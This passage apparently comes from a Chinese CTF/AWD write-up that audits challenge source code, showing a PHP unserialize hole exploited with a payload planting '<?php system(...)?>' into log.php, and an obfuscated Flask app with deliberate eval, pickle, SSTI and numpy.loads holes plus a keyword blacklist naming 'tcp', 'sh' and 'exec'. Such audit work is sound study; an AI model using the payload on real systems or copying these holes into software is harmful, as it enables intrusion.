class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\w+$/&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;no!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$username</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php?c=User&amp;a=home&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;password error!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次登录测试</p><p><img src="/mdimg/gjsweb/1743832810399-3662eef8-94ec-4198-8e9c-772f5bb104d7.png"></p><p><img src="/mdimg/gjsweb/1743832824564-0d76e53a-0c2e-40de-b8c1-cd784a628652.png"></p><p><code>lib</code>目录的类审完了，而<code>index</code>调用的<code>function.php</code>是在<code>common</code>目录的</p><p>接着审<code>common</code>目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=UTF-8&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">j1nd</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;12s1&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) ;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$this</span>-&gt;test);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_serialized</span>(<span class="hljs-params"> <span class="hljs-variable">$data</span> </span>) </span>&#123;<br>     <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$data</span> );<br>     <span class="hljs-keyword">if</span> ( <span class="hljs-string">&#x27;N;&#x27;</span> == <span class="hljs-variable">$data</span> )<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>     <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&#x27;/^([adObis]):/&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$badions</span> ) )<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>     <span class="hljs-keyword">switch</span> ( <span class="hljs-variable">$badions</span>[<span class="hljs-number">1</span>] ) &#123;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;O&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span> :<br>             <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&quot;/^<span class="hljs-subst">&#123;$badions[1]&#125;</span>:[0-9]+:.*[;&#125;]\$/s&quot;</span>, <span class="hljs-variable">$data</span> ) )<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>             <span class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span> :<br>             <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&quot;/^<span class="hljs-subst">&#123;$badions[1]&#125;</span>:[0-9.E-]+;\$/&quot;</span>, <span class="hljs-variable">$data</span> ) )<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>             <span class="hljs-keyword">break</span>;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable">$post_data</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_serialized</span>(<span class="hljs-variable">$post_data</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post_data</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$post_data</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好 &quot;</span>.<span class="hljs-variable">$post_data</span>.<span class="hljs-string">&quot;,你的简历分数为 &quot;</span>.<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">60</span>,<span class="hljs-number">100</span>).<span class="hljs-string">&quot; 分&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;请输入你的名字&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;form action=<span class="hljs-string">&quot;#&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>j1nd明显存在反序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">j1nd</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;12s1&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;log.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) ;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$this</span>-&gt;test);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>wakeup</code>在反序列化时会自动调用，将传入的字符写入<code>log.php</code>，这里可以写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable">$post_data</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_serialized</span>(<span class="hljs-variable">$post_data</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post_data</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$post_data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只调用了<code>is_serialized</code>来检查是否为合法的序列化字符串，没有waf</p><p>post传入<code>name=O:4:&quot;j1nd&quot;:1:&#123;s:4:&quot;test&quot;;s:22:&quot;&lt;?php system(&#39;dir&#39;);?&gt;&quot;;&#125;</code></p><p><img src="/mdimg/gjsweb/1743833849358-a6e02df8-5fe9-4c89-a187-c1d7cb001287.png"></p><p><img src="/mdimg/gjsweb/1743833886822-8d5c89e6-9599-4ba6-b074-13a82e03e5b5.png"></p><p>这里反序列化对业务没什么影响，直接删掉就行</p><p>因为题目需要命令执行curl平台获取flag，所以别的拿不到shell的如xss的漏洞就不分析了</p><h1 id="wo"><a href="#wo" class="headerlink" title="wo"></a>wo</h1><p><a href="https://wwpq.lanzouq.com/iCUTB2ss2orc">https://wwpq.lanzouq.com/iCUTB2ss2orc</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template,send_from_directory, make_response,redirect<br><span class="hljs-keyword">from</span> Archives <span class="hljs-keyword">import</span> Archives<br><span class="hljs-keyword">import</span> pickle,base64,os<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">import</span> numpy<br><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> shelve<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br>YRpxSAtoUsibvJYSNLIvYolgwUhZrDuu = <span class="hljs-string">&#x27;guestbook.dat&#x27;</span><br>app = Flask(__name__)<br>xNBDtkLZDLeJdmLDjVGzuwsZtSakcPrb = Environment()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fGvJjqhhlDZwxjaOwhkjDPwybGqGCuPO</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,<span class="hljs-built_in">str</span></span>):<br>    lXKGklgbUoAEcAamQHRaTQumElxjTikM = <span class="hljs-string">&quot;%s&#x27;%s&#x27;&quot;</span>%(<span class="hljs-built_in">type</span>,<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(lXKGklgbUoAEcAamQHRaTQumElxjTikM)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(lXKGklgbUoAEcAamQHRaTQumElxjTikM)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cwPvcZjBhEWaVhLRfzZbwgpDWBuuDfWn</span>():<br>    XOEQzutgbKvbuPWaJyfXTVCsoYcidwvR = [<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>]<br>    <span class="hljs-keyword">return</span> choice(XOEQzutgbKvbuPWaJyfXTVCsoYcidwvR)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">global</span> Archives<br>    mKoIjtaJXbQWuvPTIyRJdQAjhuCCrKZF = make_response(render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, Archives = Archives))<br>    rOziJaxndtrMPokMGsHkeiErrIZkSief = <span class="hljs-built_in">bytes</span>(cwPvcZjBhEWaVhLRfzZbwgpDWBuuDfWn(), encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    IIGXwOObBDgaVHOgKthObhluszUJGfhE = base64.b64encode(rOziJaxndtrMPokMGsHkeiErrIZkSief)<br>    mKoIjtaJXbQWuvPTIyRJdQAjhuCCrKZF.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, value=IIGXwOObBDgaVHOgKthObhluszUJGfhE)<br>    <span class="hljs-keyword">return</span> mKoIjtaJXbQWuvPTIyRJdQAjhuCCrKZF<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Archive/&lt;int:id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Archive</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-keyword">global</span> Archives<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span>&gt;<span class="hljs-built_in">len</span>(Archives):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, GnhtpzUMRZloJKxoggvYzVPFZegJOBQo=<span class="hljs-string">&#x27;文章ID不存在！&#x27;</span>, status=<span class="hljs-string">&#x27;失败&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;Archive.html&#x27;</span>,Archive = Archives[<span class="hljs-built_in">id</span>])<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zpKLpJWhionTVIBpMmOfVRFFymwnHWoW</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">type</span> = request.form[<span class="hljs-string">&#x27;type&#x27;</span>][:<span class="hljs-number">1</span>]<br>        GnhtpzUMRZloJKxoggvYzVPFZegJOBQo = request.form[<span class="hljs-string">&#x27;msg&#x27;</span>]<br>        <span class="hljs-keyword">try</span>:<br>            zMpdRCCXcdRMDQAYCiuCtURTmTRZwYlj = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>            zMpdRCCXcdRMDQAYCiuCtURTmTRZwYlj = pickle.loads(zMpdRCCXcdRMDQAYCiuCtURTmTRZwYlj)<br>            QfCbVmxHtTcYDksiPcqCWgrNervHQDoA = zMpdRCCXcdRMDQAYCiuCtURTmTRZwYlj[<span class="hljs-string">&quot;name&quot;</span>]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> soxXYgIdELQdYcvNUKELZyQBSnEuiGaZ:<br>            <span class="hljs-built_in">print</span>(soxXYgIdELQdYcvNUKELZyQBSnEuiGaZ)<br>            QfCbVmxHtTcYDksiPcqCWgrNervHQDoA = <span class="hljs-string">&quot;Guest&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(GnhtpzUMRZloJKxoggvYzVPFZegJOBQo)&gt;<span class="hljs-number">35</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, msg=<span class="hljs-string">&#x27;留言太长了！&#x27;</span>, status=<span class="hljs-string">&#x27;留言失败&#x27;</span>)<br>        GnhtpzUMRZloJKxoggvYzVPFZegJOBQo = GnhtpzUMRZloJKxoggvYzVPFZegJOBQo.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        GnhtpzUMRZloJKxoggvYzVPFZegJOBQo = GnhtpzUMRZloJKxoggvYzVPFZegJOBQo.replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        lXKGklgbUoAEcAamQHRaTQumElxjTikM = fGvJjqhhlDZwxjaOwhkjDPwybGqGCuPO(<span class="hljs-built_in">type</span>,GnhtpzUMRZloJKxoggvYzVPFZegJOBQo)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>,msg=lXKGklgbUoAEcAamQHRaTQumElxjTikM,status=<span class="hljs-string">&#x27;%s,留言成功&#x27;</span>%QfCbVmxHtTcYDksiPcqCWgrNervHQDoA)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<br>        <span class="hljs-string">&#x27;object&#x27;</span>,<br>        <span class="hljs-string">&#x27;exec&#x27;</span>,<br>        <span class="hljs-string">&#x27;sh&#x27;</span>,<br>        <span class="hljs-string">&#x27;__getitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;import&#x27;</span>,<br>        <span class="hljs-string">&#x27;=&#x27;</span>,<br>        <span class="hljs-string">&#x27;open&#x27;</span>,<br>        <span class="hljs-string">&#x27;sys&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>,<br>        <span class="hljs-string">&#x27;os&#x27;</span>,<br>        <span class="hljs-string">&#x27;tcp&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>,<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>,<br>        <span class="hljs-string">&#x27;base64&#x27;</span>,<br>        <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;eval&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hack&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SxMqGQyIdzOCUNdeTwDZZJuHTYGkQMQj</span>():<br>    QfCbVmxHtTcYDksiPcqCWgrNervHQDoA = request.cookies.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    QfCbVmxHtTcYDksiPcqCWgrNervHQDoA = <span class="hljs-built_in">str</span>(base64.b64decode(QfCbVmxHtTcYDksiPcqCWgrNervHQDoA), encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag = _sandbox_filter(QfCbVmxHtTcYDksiPcqCWgrNervHQDoA)<br>    <span class="hljs-keyword">if</span> flag:<br>        kdwpAYPhTQqfOhoGvxkJCgXzhPGSTffw = <span class="hljs-string">&quot;error&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        kdwpAYPhTQqfOhoGvxkJCgXzhPGSTffw = xNBDtkLZDLeJdmLDjVGzuwsZtSakcPrb.from_string(<span class="hljs-string">&quot;Hello , &quot;</span> + QfCbVmxHtTcYDksiPcqCWgrNervHQDoA + <span class="hljs-string">&#x27;!&#x27;</span>).render()<br>    gWeZkmbNCfXlUwwbthMybQBdITCvauAC = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, msg=kdwpAYPhTQqfOhoGvxkJCgXzhPGSTffw,is_value=gWeZkmbNCfXlUwwbthMybQBdITCvauAC)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getvdot&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">IbAzRdGFLYjmgtPtMzksPoPcLlfmMcmW</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;getvdot.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        vHPhdVwXzQvfkSybPzjduwOGzgnSaZPh = base64.b64decode(request.form[<span class="hljs-string">&#x27;matrix1&#x27;</span>])<br>        nSfOYIgAEjKvUPfnrnrvLevChCHltxIh = base64.b64decode(request.form[<span class="hljs-string">&#x27;matrix2&#x27;</span>])<br>        <span class="hljs-keyword">try</span>:<br>            vHPhdVwXzQvfkSybPzjduwOGzgnSaZPh = numpy.loads(vHPhdVwXzQvfkSybPzjduwOGzgnSaZPh)<br>            nSfOYIgAEjKvUPfnrnrvLevChCHltxIh = numpy.loads(nSfOYIgAEjKvUPfnrnrvLevChCHltxIh)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> soxXYgIdELQdYcvNUKELZyQBSnEuiGaZ:<br>            <span class="hljs-built_in">print</span>(soxXYgIdELQdYcvNUKELZyQBSnEuiGaZ)<br>        MShnjPALwkCgUwdIIsFjYyhGvVsEgVLc = numpy.vdot(vHPhdVwXzQvfkSybPzjduwOGzgnSaZPh,nSfOYIgAEjKvUPfnrnrvLevChCHltxIh)<br>        <span class="hljs-built_in">print</span>(MShnjPALwkCgUwdIIsFjYyhGvVsEgVLc)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;getvdot.html&#x27;</span>,GnhtpzUMRZloJKxoggvYzVPFZegJOBQo=MShnjPALwkCgUwdIIsFjYyhGvVsEgVLc,status=<span class="hljs-string">&#x27;向量点积&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">NQzCOHhQGLnkvYTdoikmOuTdFaWjmTHF</span>(<span class="hljs-params">WDMsReWUjirxIhWHctkSdWwIzklwpiug, OyfWRhsWSvszaMjArDigQxyOIgJOoUlz, SebLkcLkWvHNmVcyqtZpABrmqibklCEB</span>):<br>    lOHzOeKudYbieOwNWhNXqmmklcqXakZH = shelve.<span class="hljs-built_in">open</span>(YRpxSAtoUsibvJYSNLIvYolgwUhZrDuu)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;greeting_list&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lOHzOeKudYbieOwNWhNXqmmklcqXakZH:<br>        RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH = []<br>    <span class="hljs-keyword">else</span>:<br>        RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH = lOHzOeKudYbieOwNWhNXqmmklcqXakZH[<span class="hljs-string">&#x27;greeting_list&#x27;</span>]<br>    RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH.insert(<br>        <span class="hljs-number">0</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: WDMsReWUjirxIhWHctkSdWwIzklwpiug, <span class="hljs-string">&#x27;comment&#x27;</span>: OyfWRhsWSvszaMjArDigQxyOIgJOoUlz, <span class="hljs-string">&#x27;create_at&#x27;</span>: SebLkcLkWvHNmVcyqtZpABrmqibklCEB&#125;)<br>    